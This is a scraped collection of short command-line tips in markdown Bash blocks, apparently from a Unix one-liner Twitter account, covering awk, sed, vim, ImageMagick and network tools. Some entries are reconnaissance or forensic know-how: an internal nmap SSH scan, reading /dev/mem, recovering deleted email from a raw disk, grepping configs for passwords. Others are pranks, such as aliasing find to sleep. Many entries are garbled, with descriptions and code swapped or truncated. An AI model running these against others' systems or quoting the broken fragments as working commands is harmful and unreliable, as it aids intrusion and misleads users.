 stat -c '%a %n' * https://t.c...
```

- Check physical host for vuln. CVE-2017-5689

```Bash
 lspci | grep -q -e MEI -e HECI && echo "Check your firmware for Intel AMT vulnerability"
```

- I Vound Ze Force

```Bash
 man zforce
```

- Know your limits

```Bash
 getconf -a | sort -k2nr | grep MAX
```

- Print the line before a line containing 'password' in the file 'config'

```Bash
 sed -n '/password/{x;p};h' config
```

- List the filenames that contain the IP address 19.19.32.62 (-F = fixed string only for faster search)

```Bash
 grep -F -l 19.19.32.62 *.log
```

- UndocumentedFeatures

```Bash
 I've been using SSH for decades and I didn't even know this was possible. https://t.co/WubSNKshF5
```

- See what the word inconceivable really means. dict also shows thesaurus entries, which is quick and useful

```Bash
 dict inconceivable
```

- SSH version change

```Bash
 bro-cut -Cd ts host host_p unparsed_version <software.log|awk -F\\\\t \'$2=="10.2.3.4" && $3=="22"{if(l!=$4){print;l=$4}}\'
```

- :D I guess they broke with the default info page format for this special info page. This cracked me up

```Bash
 info man
```

- GNU grep has not well documented options --no-group-separator and --group-seprator="\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac"

```Bash
 grep -h --no-group-separator 404 *.log
```

- Play a video file recent.mp4 at 8x speed, looping it seamlessly forever

```Bash
 mplayer recent.mp4 -loop 0 -speed 8
```

- The authbind program allows a non-root user to listen on ports below 1024. Needs to be configured first though

```Bash
 authbind nc -v -l 80
```

- WorldPenguinDay. Here is a video of me making Tux out of play-doh. https://t.co/jf3PaMopzn

```Bash
 Its
```

- Dump information from a CDP frame received on eth0

```Bash
 tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
```

- You can reverse a set of "records" using tac with the -s option and a record separator. Used to make globe spin backwards

```Bash
 tac -s "^[[H
```

- One world, no pv version

```Bash
 o=$(curl -Ls bit\\.ly/globe_vt);yes "$o"|perl -ne \'$/="\\e[H";$\\=$/;print "$_";select(undef,undef,undef,1/24);\'
```

- ASCII globe animation

```Bash
 oneworld=$( curl -Ls http://bit\\.ly/globe_vt );while sleep .1;do pv -L4220 -q  < "$oneworld";done
```

- List traffic from inside to outside

```Bash
 awk \'$3~/^172\\.16\\./ && $5!~/^172\\.16\\./{printf("%s %s\\n",strftime("%Y-%m-%d_%T", $1),$0)}\' conn.log
```

- (remote: base64 -d > file) On short files over complex transfer paths between hosts, try copy/paste the base64 output

```Bash
 base64 -w4095 file
```

- Get the entries with 4+ null fields and sort the entries by IPv4 (-V) in the 3rd column

```Bash
 egrep -- "\\t-\\t-\\t-\\t-\\t" entries.txt |sort -k3V
```

- CheckYourPrivilege @climagic

```Bash
  sudo -l
```

- You can use -e multiple times for multiple expressions. Nice when you have multiple complex items

```Bash
 grep -e foo -e bar -e baz file
```

- Starts a WebSocket server and prints all requests to stdout @climagic

```Bash
  nc -k -l 4444
```

- Generate list of installed RPM names(left align) and their packager in formated columns

```Bash
 rpm -qa --queryformat "%-47{NAME} %{PACKAGER}\\n
```

- Insert all the possible command line completions into the command line you are editing. Life, the Universe and Everything

```Bash
 <Meta-* >
```

- Operate and get next line. This executes the current line from your history and on return gives you the next history line

```Bash
 <Ctrl-o >
```

- This indicates to the program that there is no more input. In the shell, this usually closes the shell

```Bash
 <Ctrl-d >
```

- Delete everything from the cursor to the beginning of the line. This can also be used to clear a password attempt and start over

```Bash
 <Ctrl-u >
```

- Delete the previous word on the command line (before the cursor). This is highly useful when reusing old commands

```Bash
 <Ctrl-w >
```

- This is usually equivalent to running 'clear'.  Its usually quicker and doesn't leave the command in your command line history

```Bash
 <Ctrl-l >
```

- Incremental undo of command line edits

```Bash
 <Ctrl-_ >
```

-  >

```Bash
 <Meta-
```

- Insert the last argument from the previous line in the command history into the current line. Different from !$

```Bash
 <Meta-. >
```

- Move your cursor to the end of the line. Faster than holding down right arrow

```Bash
 <Ctrl-e >
```

- Move your cursor to the beginning of the line. Faster than holding down left arrow. In screen, you need to press <Ctrl-a a >

```Bash
 <Ctrl-a >
```

- Reverse search through your command history for 'string'. Press Ctrl-r again to continue searching backwards. ESC when done

```Bash
 <Ctrl-r >string
```

##

```Bash
 alias find='sleep $((RANDOM%60+5))
```

- Make the flag of Japan with ImageMagick

```Bash
 convert -size 150x100 xc:white -fill red -draw 'circle 75,50 75,75' flagofjapan.png
```

- Pipe text from Wikipedia into sed, print regex+6 lines

```Bash
 elinks https://t.co/3MFZmCM3PA |sed -n '/Article 12/,+6p'
```

- The pee command can run head and tail on same input. sponge waits for all the data first

```Bash
 ping -c100 4.2.2.2 | sponge | pee head tail
```

- Poor man's hacker typer in the terminal

```Bash
 locate --regex '\\.c$' | shuf | head -1 | xargs pv -q -L 20
```

- Jeez, how far back do these lastlogs go?

```Bash
 last -da|cut -c27-30|uniq|awk -v y=$(date +%Y) \'{if(/Jan/){print $0;print "-- " y--}else{print}}\'
```

- Show directory size and sort by human readable amount (MB, GB, etc.). Requires GNU sort for -h option

```Bash
 du -sh */ | sort -h
```

- Copy files (cp) and preserve their timestamps and permissions (-a) while showing what is happening (-v)

```Bash
 cp -av /olddisk /newdisk
```

- Clear your copy buffer 10-20 seconds. OSX version

```Bash
 while :; do [ ! -z "$a" ] && { a=""; pbcopy  < "$a"; } || a=$(pbpaste); sleep 10; done
```

- Clear your copy buffer after 10-20 seconds

```Bash
 while :; do [ ! -z "$a" ] && { a=""; xsel  < "$a"; } || a=$(xsel); sleep 10; done
```

- A unique really-realtime\xe2\x84\xa2 chat experience on older Unix that maybe Randall never got to use

```Bash
 talk
```

- Convert Mac OS icon file into a set of images to edit. I just used that for custom firefox profiles

```Bash
 iconutil -c iconset firefox.icns
```

- Auto type next $n on click

```Bash
 n=1;while :;do xinput --query-state 8|grep \'button\\[1\\]=d\' &&{ xdotool type "$n"; n=$[n+1]; };sleep 0.3;done
```

- Check the last modified date of a file over HTTP

```Bash
 curl -sI https://t.co/DAQGsQi6wQ | grep Last-Modified
```

- !/bin/bash\\necho My cksum is 918329835' > magic

```Bash
 echo -e '
```

- Tron lightcycles in the terminal or Etch-a-sketch. Or make a snake game

```Bash
 https://t.co/Kvo0jd2eTK
```

- Meta

```Bash
 at 3pm  < \'t update "Post an update at a later time to twitter. Like this one."\'
```

- Print the extended ASCII table. For @drscriptt

```Bash
 for x in {8,9,{A..F}}{{0..9},{A..F}} ; do printf "$x %c\\n" $( xxd -r  < "0 $x" ) ; done
```

- When lexical sorting messes up numeric ordering, use brace expansion to put file args in correct numeric order

```Bash
 mplayer movie-p{1..27}.m4v
```

- Do an strace of evince and write all syscalls to logfiles even if it forks

```Bash
 strace -s8192 -o evincetrace -ff evince file.pdf
```

- Print lines from columns.txt where the first column is the same as the second column

```Bash
 awk '$1==$2' columns.txt
```

- Fill a file with a range of IPs from 10.0.1.1 - 10.0.4.254, one IP per line

```Bash
 printf "%s\\n" 10.0.{1..4}.{1..254} > network-ips.txt
```

- For lines with a specific IP in them, convert the epoch times to dates

```Bash
 grep 10.50.60.70 logs.txt | cut -f1 | sed 's/^/@/' | date -f -
```

- CLI clients for other popular services like Spotify, Tunein, IHeartRadio, etc. A quick search should find them

```Bash
 There are also
```

- Pandora music client for the command line. You may have to dl from github and compile. https://t.co/HBv7MZjR7A

```Bash
 pianobar
```

- NameCollisions

```Bash
 Co-worker: Do you use Slack?\rMe: Yeah I've been using Slack since 1994 when it came on like 70 floppies.\rCo-worker: Huh?\r
```

- Perform arbitrarily large math, while disabling bc's \\ + newline output "feature"

```Bash
 BC_LINE_LENGTH=0 bc  < "2^4096
```

- Show the full last modified epoch time including nanoseconds of /etc/passwd (GNU version)

```Bash
 date -d "$(stat -c %y /etc/passwd)" +%s.%N
```

- This is some of the best #UNIX humour I've even read. Warning: for geeks only.

```Bash
 https://t.co/f75QV47eSd
```

- list all files (-a) in PWD with details (l) and order them by size (S) ascending (-r), make sizes human readable (-h)

```Bash
 ls -lShra
```

- Lookup allocation/"ownership" information for an IP address. Apparently a lot of IT folk still don't know this

```Bash
 whois 66.163.186.42
```

- Backup IMDb board pages in cache

```Bash
 mkdir ~/imdb/ ; egrep -lr 'imdb\\.com/.*/board/' ~/.cache/mozilla/firefox | xargs -I{} cp -va {} ~/imdb/
```

- When you have 2+ tmux clients on the same session and another one is on a smaller window

```Bash
 tmux list-clients ; tmux detach-client -t pts/22
```

- Because you shouldn't have to constantly be bombarded with ads for underwear when reading programming documentation

```Bash
 elinks
```

- Read the BIOS on PC hardware. Thanks @Fr33Wor1d, better late than never

```Bash
 dd if=/dev/mem bs=1k skip=768 count=256 2 >/dev/null | strings -n 8
```

- Count the number of commas (,) in a text file

```Bash
 tr -cd , < file.txt | wc -m
```

- Make a bunch of mount point directories all at once. All combos of sdb1 through sde9 inclusive

```Bash
 sudo mkdir /mnt/sd{b..e}{1..9}
```

- Getting rid of query string in filename by surrounding it with {,}

```Bash
 mv image-file-with-query-string.jpg{?query-string=Z29vZCBqb2IK,}
```

- Look for email data on a hard drive, even if it was "deleted". Encrypt your FS!

```Bash
 sudo strings /dev/sdc | grep -C200 "Received:
```

- % US pop. murdered 1960-2015

```Bash
 elinks -dump bit\\.ly/qutWZK|tr -d ,|sed -e \'/^2015/q\'|awk \'/^[12]/{p=$6/$2*100; printf "%d %0.4f%%\\n",$1,p}\'
```

- Change the hue of an image by -90 degrees. 50 = ( -90 * 100/180 ) + 100

```Bash
 convert bluethumb.png -modulate 100,100,50 greenthumb.png
```

- Right-align text on 80 columns

```Bash
 sed -E ':a /.{80}/!{s/^/ /;ba}' file
```

- CLIMagic video: Epic demo of how I watched Superbowl 46 over a netcat stream

```Bash
 https://t.co/iXz161lDEg
```

- Print the decimal encoded value of a ). The ' before the character tells printf to interpret the character this way

```Bash
 printf "%d\\n" )
```

- Make URLs from data before foo

```Bash
 grep -B3 "foo" multilinedata.txt |egrep "^Id:" |while read x x id; do echo "https://hostname/${id}"; done
```

- Get a sample of 10 lines from a large log file, 100,000 lines from the end of the file

```Bash
 tail -n100000 large.log | head
```

- An interactive command line game challenge. Allows various solutions. And yes, each of them are solvable in 140

```Bash
 https://t.co/KCC08mJCX8
```

- unixsongs thread happening on right now. We did a while back with Unix band names

```Bash
 Check out the
```

- Filename with colons giving you problems with scp or rsync? Use the ./ path prefix B4 filename

```Bash
 scp ./file:with:colons.txt user@otherhost:
```

- Happy 80th Philip Glass

```Bash
 cd /etc;n=CAGBFDEC;stat -c%a *|while read -n1 k;do x=${n:$k:1};sleep .2;play -qn synth tri ${x}4 fade 0 .1937&done
```

- Full screen seamless play your mp4 videos without borders. No window switching

```Bash
 mplayer -fs -noborder -fixed-vo *.mp4
```

- Move mouse in spiral

```Bash
 x=0;y=0;while [[ $y -lt 500 ]] ; do xdotool mousemove --polar $x $y ; x=$(($x+4));y=$(($y+1)); sleep 0.01; done
```

- Today is day

```Bash
 date -d"2009-12-15 +2600 days"||date -v2009y -v12m -v15d -v+2600d; play -n synth sin 2600 trim 0 1 vol .05
```

- infosec is in Firefox and Chrome's developers tools, both have a "Copy as curl command" function in their network tab

```Bash
 A useful tool for
```

- Catch a snooper

```Bash
 inotifywait -e open juicy.dat && w | awk \'$5~/\\.00s/\' | mailx -s "Someone accessed juicy.dat" you@example.com
```

- Analyze your whole lastlog to see the different remote hosts for each user

```Bash
 last -da | awk \'{print $1 " " $NF}\' | sort | uniq -c
```

- See what the POTUS "probably" tweeted

```Bash
 t timeline -l realDonaldTrump|egrep ^[0-9]|while read -r f u; do t status -l $f;done |grep Android
```

- Show top count for col3, 2016-07 - 2017-01

```Bash
 sed -n '/^2017-01/,/^2016-06/p' logs.csv |sed '$d' |awk -F, '{print $3}' |sort|uniq -c|sort -rn
```

- Ex "acronym FBI" Thx @Sh1bumi

```Bash
 acronym(){ elinks -no-numbering -dump "https://t.co/uKT3MTb9Ap${1:-RTFM}.html"|sed -n \'/Rank Abbr/,/^$/p\'; }
```

- grep gziped log files from .gz files in dirs starting with 2017-01-1 & 1 wild character

```Bash
 zgrep SSH::Password_Guessing 2017-01-1?/notice.*gz
```

- That program you try to run when your network is laggy

```Bash
 lessssssssssssssssssssssssssssss
```

- Open all your JS source files in vim tabs. Then use :tabn and :tabp to switch between them. :tabe newfile to open new tab

```Bash
 vim -p *.js
```

- Swirly plasma background. Uses ImageMagick

```Bash
 convert -size 2420x1580 plasma:fractal -blur 2x2 -swirl 270 -crop 1920x1080+250+250 swirlbg.png
```

- Print the dates for all the following Saturdays in 2017 for use in a document

```Bash
 printf "2017-01-14 + %d weeks\\n" {1..50} |date -f- +"%B %_d
```

- For MacOS X users. Aphex Twin fans may recognize this as the beginning of "Cow Cud is a Twin"

```Bash
 say -v hysterical aphex twin
```

- Read man page BUGS in style. saybugs bash

```Bash
 saybugs(){ man $1|col -b|sed -n '/^BUGS/,/^[A-Z]/p' |tail -n+2 |{ say --voice=Bad||espeak; }; }
```

- Without opening up the man page viewer, search for instances of '!' and display with surrounding context

```Bash
 man procmailrc | grep -C10 '!'
```

- Prefix each line with the local time based on epoch time in 1st column

```Bash
 |gawk \'{printf("%s %s\\n",strftime("%Y-%m-%d_%T", $1),$0)}\'
```

- Use the 't' client to list in real time people using the word 'speaker' in their tweet. https://t.co/OVdxgYRKNF

```Bash
 t stream search -l speaker
```

- Find email addresses with 2 letter TLDs in them. \\ > matches empty string at end of a word

```Bash
 egrep -i "@[a-z\\.-]+\\.[a-z]{2}\\ >" emails.txt
```

- Sometimes, there are files that find can't find no matter how many options you try

```Bash
 find / -please-find-the-file-i-want
```

- IToldYouSo

```Bash
 Its been 10 years since the iPhone and see, we still use desktops and laptops. New devices just fill in the gaps in our lives.
```

- While within

```Bash
 [Ctrl-X] [Ctrl-F]
```

- A color show in your shell

```Bash
 yes "$(seq 16 231)" | while read i; do printf "\\x1b[48;5;${i}m\\n"; sleep .02; done
```

- restore a

```Bash
 pv bigdump.sql.gz | gunzip | mysql
```

- Find files under /var/log that are readable by the current user. Takes groups and ACLs into account

```Bash
 find /var/log -readable -ls
```

- Fix image aspect ratios for Instagram. Thx @fulldecent

```Bash
 mogrify -resize 1080x1350 -gravity center -extent 1080 *.jpg
```

- Your laptop says ESSID names while you drive around

```Bash
 while true;do iwlist wlan0 scan |awk -F\\" \'/ESSID/{print $2}\' |espeak;done
```

- CommandLineForever https://t.co/iPYmYo7kTb

```Bash
 More popular than ever in 2017.
```

- Search the file system, but don't descend into the /sys or /proc directories

```Bash
 find / \\( -path /proc -o -path /sys \\) -prune -o -print
```

- $u))%230))m\\u$u\\033[0m"; done

```Bash
 printf "%x\\n" {1..65535} | while read -r u ; do printf "\\033[38;5;$((16+$((16
```

- Use the -w option in diff to ignore differences in whitespace (tabs instead of spaces, etc.)

```Bash
 diff -w index.html bookexample/index.html
```

- curl supports numeric ranges. This is the full 14 days of unix-mas from 2012

```Bash
 curl -Ns http://www.climagic\\.org/uxmas/[1-14]
```

- Quickly find the largest 5 files in the CWD tree without crossing filesystem boundaries

```Bash
 find . -xdev -ls | sort -n -k 7 | tail -5
```

- Start a web server on port 8000 that uses CWD. See https://t.co/Lbnvv0CjmA for other language examples

```Bash
 python -m SimpleHTTPServer
```

- Play local microphone on remote machine's speakers. Fun for pranks. Uses sox package

```Bash
 rec -t wav - | ssh user@remotehost play -t wav -
```

- Encapsulate UDP packets in a TCP stream so it can be tunneled through an SSH tunnel, etc

```Bash
 socat -v UDP-LISTEN:8161,fork TCP:localhost:8161
```

- Make it snow in your terminal. In case you don't have pv or perl. Also, explains the last command

```Bash
 https://t.co/mPoGSm9FTn
```

- Go directly to the crontab man page that is in chapter 5 of the unix manual pages. Some topics have multiple man pages

```Bash
 man 5 crontab
```

- Automatically installs your public key to the remote host (this is included in the openssh package)

```Bash
 ssh-copy-id 'user@remotehost'
```

- Scan your internal network for hosts listening on TCP port 22 (SSH protocol)

```Bash
 nmap --open -p T:22 192.168.1.0/24
```

- Make box around text. By @bartonski

```Bash
 function box() { t="$1xxxx";c=${2:-=}; echo ${t//?/$c}; echo "$c $1 $c"; echo ${t//?/$c}; }
```

- Delete messages from Dec 11th in the postfix queue

```Bash
 mailq | awk '/^[0-9A-F]+ .+ Dec 11 /{print $1}' | xargs -n 1 postsuper -d
```

- Display top bandwidth hogs on website

```Bash
 awk \'{a[$1] += $10} END {for (h in a) print h " " a[h]}\' access_log | sort -k 2 -nr | head -10
```

- CABB1E' -draw "polygon 35,140 115,130 150,55 310,55 350,130 460,150 460,210 35,210" cabbie.png

```Bash
 convert -size 500x300 xc:white -fill xc:\'
```

- C0FFEE

```Bash
 display -size 300x400 -negate xc:'
```

- List files in current directory with a .php extension that DO NOT contain a PHP open code block tag

```Bash
 grep -L '<?php' *.php
```

- Use rev twice to get around cut not being able to relatively remove 3 letters from the end of lines

```Bash
 cat uuoc.txt | rev | cut -c 3- | rev
```

- Find which Debian package the notify-send program is included with - > libnotify-bin

```Bash
 dpkg -S $( which notify-send )
```

- Pass the output of which (showing path to lspci) into rpm's -qf, which tells you the pkg

```Bash
 rpm -qf $( which lspci )
```

- CABB1E is a cool one too since its actual color matches the word. Also,

```Bash
 @gumnos @keithpjolley Nice.
```

- Do an rsync and limit the bandwidth used to about 200 KBytes/sec. Useful on shared or slow links

```Bash
 rsync --bwlimit=200 src dest
```

- Determine what lines two different files have in common. The comm program requires sorted files

```Bash
 comm -12 <(sort names1) <(sort names2)
```

- Make thumbnails of images IMG_3000.JPG - IMG_3499.JPG

```Bash
 for i in IMG_3[0-4]*.JPG ; do convert -quality 60 -geometry 300 $i thumbs/$i ; done
```

- Join the splits back together

```Bash
 cat split-xaa split-xab split-xac > rejoinedlargefile
```

- Split a file called largefile into 1 gigabyte pieces called split-xaa, split-xab, split-xac

```Bash
 split -b 1G verylargefile split
```

- List the 20 largest files or folders under the current working directory

```Bash
 du -ma | sort -nr | head -n 20
```

- /

```Bash
 grep '^[a-fois]\\{6\\}$' /usr/share/dict/words|sed 'h;y/ois/015/;x;G;s/\\n/- >
```

- AdaLovelace

```Bash
 Ada: I think computers may one day process text, music and pictures.\rCharles: [Bollocks!]\rDon't let the bastards grind you down
```

- Print the running average of the last 3 temp values in front

```Bash
 awk \'{sum+=$1;n++;if (n==3){print sum/3 "\\t" $0;n=0;sum=0}}\' garage-temp.log
```

- Temperature log from JSON

```Bash
 while sleep 1m; do date +%F_%T |tr $\'\\n\' " "; curl -s 192.168.2.50 |jq .[2].temperatureF ;done | tee -a temp.log
```

- Count unique colors in an image. From @lorddrachenblut (2014)

```Bash
 identify -format %k https://t.co/Aqy4qFfay7
```

- Backslashing the * glob instead of quoting the expression. From @lorddrachenblut (2014)

```Bash
 find ./music  -name \\*.mp3 -exec cp {} ./new \\;
```

- Build a private mirror of the public mirror. Thx LordD

```Bash
 rsync -aqzH (public mirror that supports rsync).???::CentOS /path/to/locate/mirror
```

- Use FXP to transfer files between 2 ftp servers. By @lorddrachenblut

```Bash
 lftp > mirror -R ftp://from.j.com/directory1 ftp://to.j.net/directory2
```

- tag all mp3 in PWD as genre podcast. By @lorddrachenblut (2011)

```Bash
 find . -maxdepth 1 -iname '*.mp3' -exec eyeD3 -G podcast \\{} \\;
```

- This will run ls without using any alias called ls that might be in place. You can do this with any command

```Bash
 \\ls
```

- Add this to .vimrc and all searches in vim will use "very magic" mode which acts like egrep. Thx @nickmorrott L3viathan2142

```Bash
 nnoremap / /\\v
```

- Long list (-l) only the directories in the current directory. .*/ and */ are utilizing your shell's glob matching ability

```Bash
 ls -ld .*/ */
```

- Show only the processes matching httpd, ignoring the line of the grep process itself (regex trick)

```Bash
 ps auxww | grep "[h]ttpd
```

- Type 3 CSV cols to Google docs table

```Bash
 sleep 5;while IFS=, read {a..z};do for col in a c d;do xdotool type ${!col} $'\\t';sleep 0.3;done;done
```

- Log!

```Bash
 base64 -d < TVRoZAAAAAYAAQABAYBNVHJrAAAAOgD/UQOAAAAAkEV/CIBFfwCQRX8IgEV/AJBKfwiASn8AkEx/CIBMfwqQSX8IgEl/AJBKfwiASn//LwA=|timidity -
```

- Show photo filenames where no flash was used. Req. Imagemagick

```Bash
 identify -format "%f F:%[EXIF:Flash]\\n" *.jpg | egrep " F:(0|16|24|32)$
```

- strace is a sysadmin godsend. This will follow pid 927 and its children, writing to smtpd.<pid >

```Bash
 strace -p 927 -o smtpd -ff -tt
```

- While in

```Bash
 [Ctrl-R] %
```

- In

```Bash
 gv
```

- In vim, this will left shift indentation of selected lines by one tab. > for right

```Bash
 v (select text with cursor movement) <
```

- MakeAFilmFeelUncertain

```Bash
 .* Wars
```

- KnowVIMber

```Bash
 Before this poll, were you aware that vim and less stored your search histories in .viminfo and .lesshst respectively?
```

- This vim command will turn off the current search highlighting until the next search. Use :set hlsearch to turn on

```Bash
 :noh
```

- Help compare sizes

```Bash
 curl -L bit\\.ly/moonbox |convert - -fill none -stroke red -strokewidth 2 -draw "rectangle 76,97,1360,352" - |display -
```

- 4BitComputing4Ever

```Bash
 Today is the 45th anniversary of the Intel's first commercially available processor, the 4004 microprocessor.
```

- ] [Esc]

```Bash
 [Ctrl-V] (move cursor down across beginning of lines) [I] [
```

- Check net before slow scan

```Bash
 for d in {1..254};do ping -c3 10.3.0.5 > /dev/null ||{ echo "VPN is down";break; }; nmap -T1 10.3.0.$d ; done
```

- In vim insert mode, use this to use the digraph feature to make an \xc3\xa4. Use :digraphs show available characters

```Bash
 [Ctrl-k] a:
```

- Professional development: Learn vim while playing an adventure game

```Bash
 https://t.co/wGMlnbflmZ
```

- You can use the -n option with make to preview what it will do first before actually doing it

```Bash
 make -n install
```

- Who can see your 8.8.8.8 requests?

```Bash
 traceroute 8.8.8.8|awk -F[\\(\\)] '$2~/[0-9]/{print $2}'|while read i;do echo $i;geoiplookup $i;done
```

- UnixAMovie Read The Fucking Subtitles

```Bash

```

- Two year cal display using diff side-by-side mode (-y)

```Bash
 diff -y <(cal -y 2016) <(cal -y 2017)
```

- Record a macro called 'a' that moves down two lines (jj) and then deletes 1 line (dd). Run w/ @a, run 100 times 100@a

```Bash
 vim macro: qajjddq
```

- KnowVimber

```Bash
 @cdevers Possibly. I think @robotterror came up with a good one:
```

- YesVimber

```Bash
 Happy 25th Anniversary vim! Nov 2nd, 1991 - Nov 2nd, 2016
```

- In vim, depending on your term color scheme, these can help you w/ syntax highlighting

```Bash
 :set bg=dark or :set bg=light
```

- Did they really only change what they say they did?

```Bash
 diff <(docx2txt < agreement.docx) <(docx2txt < newagreement.docx)
```

- Decode message embedded in redirect

```Bash
 curl -sI bit\\.ly/gevpxbegerng |awk -F/ '/^Location:/{print $NF}' |(base64 -di||base64 -Di)
```

- Try to handle the case where a space is in 2nd column data

```Bash
 awk \'{if(NF==8){print $2}else if(NF==9){print $2 " " $3}}\' names.txt
```

- The hidden meaning of

```Bash
 printf "%s\\n" {A..Z} | nl | grep "[XKCD]" | awk \'{sum+=$1} END {print sum}\'
```

- mping nic.uz

```Bash
 mping(){ ping $@|awk -F[=\\ ] \'/time=/{t=$(NF-1);f=2000-14*log(t^18);c="play -q -n synth 1 pl "f"&";print $0;system(c)}\';}
```

- Fire alarm will now lock your screen

```Bash
 rec -n stat trim |& awk '/Max.*amp/{if ($NF < 0.99){exit 1}}' && xscreensaver-command -lock
```

- The t client doesn't allow streaming of mentions so

```Bash
 while :;do t mentions -rl;sleep 1m;done |awk '{if(a[$1]++<1){print}}'
```

- ParanoidGeekTips

```Bash
 No matter how much the fire alarm may hurt your ears, make sure you press that screen lock button before you leave.
```

- AWKtober

```Bash
 For the last one, makes your cursor bounce around. On Mac, quote the yes args together. When done, press Ctrl-Z and kill %1.
```

- Find incomplete years in data

```Bash
 awk -F, '/USC00120784/{print substr($6,0,4)}' weather.csv |uniq -c |awk '$2%4==0&&$1<366||$2%4!=0&&$1<365'
```

- Show only up to the first 10 packets by each source IP

```Bash
 tcpdump -nn ip | awk \'{s=$3;sub(/\\.[0-9]+$/,"",s);if(a[s]++<10){print}}\'
```

- Prefix the epoch time in column 1 with the local time

```Bash
 tail -f udp.log|gawk \'{printf("%s %s\\n",strftime("%Y-%m-%d_%T", $1),$0)}\'
```

- AWKtober

```Bash
 Find your new Raspberry Pi on the network with nmap and awk https://t.co/jSWsUZNQvB By @theurbanpenguin
```

- Display sudo's insults. Thx @KosGD

```Bash
 strings /usr/lib/sudo/sudoers.so |grep Dave -B0 -A50
```

- List top 20 404's URLs in descending order by reqs

```Bash
 awk \'$9 == "404" {print $7}\' access.log |sort|uniq -c|sort -rn| head -n 20
```

- AWKtober with your own awk/sed "Together We Can Change Anything" sticker from https://t.co/FP7f4LUULT

```Bash
 Celebrate
```

- Sort the output of df while keeping the header at the top

```Bash
 df -hP | awk \'NR==1;NR >1{print|"sort -k5rn"}\'
```

- Print the longest line in quotes.txt

```Bash
 awk 'length > max { max=length;maxline=$0 } END { print maxline; }' quotes.txt
```

- Print lines of file without printing ones already seen. $0 means whole line in awk. 'a' is an array

```Bash
 awk '!a[$0]++' file
```

- Print dupes where the 3rd column changed

```Bash
 sort gkwzFruP.txt | awk \'{if(l1==$1 && l3!=$3){print ll "\\n" $0}; ll=$0;l1=$1;l3=$3}\'
```

- Histo gen by @dez_blanchfield

```Bash
 awk -F\':\' \'!max{max=$2;}{r="";i=s=.025*$2/max;while(i-- >0)r=r"-";printf "%40s | %4d | %s %s",$1,$2,r,"\\n";}\'
```

- Sum numbers in the third column of data.txt

```Bash
 awk '{s+=$3} END {print s}' data.txt
```

- I find it amusing that the pulseaudio --kill option has a shortened option (-k) but the --start option does not

```Bash
 pulseaudio -k
```

- /)' conn.log

```Bash
 awk \'($3 == "64.39.106.131") || ($1 ~ /^
```

- Breakup compressed log by syslog date and recompress

```Bash
 zcat large.log.gz |awk \'{print $0 | "gzip -v9c > large.log-"$1"_"$2".gz"}\'
```

- Simple lunch location decider

```Bash
 echo "Tacos,Burgers,Pizza,Sushi,Salad,Noodles,Veggie wraps" | awk -F, \'{print $1}\'
```

- Print only the first From: line in each mail message file. Thx @gumnos

```Bash
 awk '/^From:/{print;nextfile}' *
```

- Display top 100 files accessed on website

```Bash
 awk '{print $7}' access_log | sort | uniq -c | sort -rn | head -100
```

- Print out just the first column (whitespace separated) of data.txt

```Bash
 awk '{print $1}' data.txt
```

- UninstallFlashFriday

```Bash

```

- SEDtember

```Bash
 Sometimes regular expressions can get messy....that's what she sed.\rWell that was awkward.\r
```

- Censor email addresses in report.txt

```Bash
 sed -r -i 's/\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[a-z]{2,30}\\b/xxx@yyy.zzz/' report.txt
```

- Compress consecutive blank lines down to just 2 in the file notes.txt

```Bash
 sed -i '/^$/N;/\\n$/N;//D' notes.txt
```

- Does the account leak affect people who ping Yahoo?

```Bash
 ping https://t.co/fBotT8rfVV
```

- Generate output similar to 'tree' without using tree

```Bash
 find . -print | sort | sed 's;[^/]*/;|---;g;s;---|; |;g'
```

- Print the high CPU process's family tree

```Bash
 ps auxwwf | sed -n -r -e '/^.{64} \\//h;/\\\\/H' -e '/^.{14} [8-9][0-9]\\.[0-9]/{x;p}'
```

- List files that confuse Git on Windows by differing only by...

```Bash
  git ls-tree -r --name-only HEAD | tr A-Z a-z | sort | uniq -d
```

- Every time a WARN: line is encountered, print the previous Path: line seen along with it

```Bash
 sed -n '/Path:/h;/WARN:/{x;p;x;p}'
```

- PeopleLikeMeBecause I post barely readable messages that when run carelessly can obliterate all your data and compromise your employment

```Bash

```

- AWKtober is coming. https://t.co/WFy5rfMKvc

```Bash
 { } yourselves,
```

- Joins multiple lines and separates them with the string "<br / >"

```Bash
 sed \':a;N;$!ba;s/\\n/<br \\/ >/g\'
```

- AWKtober is coming!

```Bash
 @surryhill
```

- ItCanWait Please stop using your phone while driving. On average, 1180 people are injured each day just in the US from distracted driving

```Bash

```

- Swap each line of input with the next line of input

```Bash
 sed -n '$p;h;n;p;g;p'
```

- Setting the LANG=C variable will often fix unexpected problems with sort ignoring symbol characters like +, - and *

```Bash
 LANG=C sort
```

- Evidence that Linux was released Sept 17th 1991

```Bash
 wget -O- ftp://ftp.funet\\.fi/pub/linux/kernel/Historic/linux-0.01.tar.gz|tar ztv|sort -k4
```

- Quickly print line 9417 of a large file without processing the whole file

```Bash
 sed '9417q;d' dbdump.sql
```

- BroCon2016 https://t.co/46JhUEbduN

```Bash
 How Texas personalizes supercomputing. @TACC
```

- AWKtober

```Bash
 @ExaGridDba
```

- Search irc.log for lines containing Alice and Bob regardless of their order in the line

```Bash
 sed '/Alice/!d; /Bob/!d' irc.log
```

- Use jq to pretty print some json data with ANSI color coded syntax and use -R in less to process the color

```Bash
 jq -C '.' data.json | less -R
```

- BroCon2016 (network security monitor) in Austin, TX this week

```Bash
 I'm at
```

- Joins multiple lines and separates them with the string "<br >"

```Bash
 sed \':a;N;$!ba;s/\\n/<br >/g\'
```

- Show only the directories in the current directory. The / at the end of the wildcards make this work

```Bash
 ls -d .*/ */
```

- Pretend you are on a starship. Req. sox package

```Bash
 play -n -c1 synth whitenoise band -n 100 20 band -n 50 20 gain +30 fade h 1 86400 1
```

- Web request chart

```Bash
 cat access_log-*|awk \'{print substr($4,5,8)}\'|uniq -c|gnuplot -e "set terminal dumb;plot \'-\' using 1:xtic(2) with boxes
```

- or --shift

```Bash
 @andrewgilmartin 'less' will let you scroll left to right. Default is by half the screen width, you can change this with -
```

- Aperl ? I'll consider it. Thanks

```Bash
 @jhparkerb Well, I don't think someone is a fool for using perl, so how about just making it all of
```

- In the find man page, show whole paragraphs containing the word modified

```Bash
 man find |sed -e '/./{H;$!d;}' -e 'x;/modified/!d;i=='
```

- Add separator commas to long numbers

```Bash
